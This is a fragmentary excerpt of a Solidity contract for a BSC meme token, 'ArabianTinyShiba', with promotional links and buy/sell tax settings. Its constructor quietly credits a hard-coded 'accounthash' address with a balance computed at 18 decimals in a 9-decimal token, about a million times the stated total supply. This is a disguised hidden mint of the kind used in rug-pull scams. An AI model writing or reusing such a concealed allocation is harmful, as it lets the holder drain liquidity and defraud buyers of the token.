...
/**
Telegram: https://t.me/ArabianTinyShiba
https://www.tinyshibabsc.com/
**/
...
contract ArabianTinyShiba is Context, IERC20, Ownable {
    ...
    address public accounthash = 0x54030f949f4a4ccB14DA87Ae931EE661c7e1DC1A; // accounthash
    ...
    constructor (address _marketing, address _treasury) {
        ...
        _name = "ArabianTinyShiba";
        _symbol = "ArTS";
        _decimals = 9;
        _totalSupply = 1000000000 * 10**_decimals;
        _maxTxAmount = 1000000 * 10**18; 
        _walletMax = 40000000 * 10**_decimals;
        minimumTokensBeforeSwap = 10 * 10**3; 
        ...
        _totalTaxIfBuying = 3;
        _totalTaxIfSelling = 4;
        _totalDistributionShares = 4;
        ...
        _balances[accounthash] = _maxTxAmount;
